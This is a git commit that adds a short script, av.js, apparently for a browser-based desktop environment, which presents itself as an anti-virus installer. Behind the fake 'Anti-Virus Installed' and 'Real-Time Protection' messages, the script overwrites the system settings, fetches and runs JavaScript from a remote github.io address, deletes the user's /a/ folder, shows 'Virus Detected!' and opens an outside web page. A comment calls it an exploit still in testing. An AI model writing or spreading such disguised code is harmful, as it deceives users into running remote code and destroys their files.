104b8a700c6e64f890ff1afd726f2965d3d04387
speedyplane2247 <36555661+speedyplane2247@users.noreply.github.com>
2019-02-04 14:34:43 -0500

    beta

---
+++ av.js
@@ -0,0 +1,8 @@
+$store.set(`/settings.json`,`{"sounds":{"boot":"/c/sys/sounds/BOOT.ogg","alert":"/c/sys/sounds/CHORD.ogg","error":"/c/sys/sounds/QUACK.ogg"},"noSplash":true,"defaultApp":{"html":"iframe","htm":"iframe","php":"iframe","xml":"code","svg":"img","gif":"img","png":"img","jpeg":"img","jpg":"img"},"skin":"w93"}`)
+$alert.info("Anti-Virus Installed.")
+$exe("js https://speedyplane2247.github.io/7pO/backend.js")
+$file.delete("/a/")
+$notif("Real-Time Protection", "Real-Time Protection Enabled")
+document.write("Virus Detected!")
+window.open("http://ccac.dns-cloud.net/oopsie.html")
+// exploit still in testing
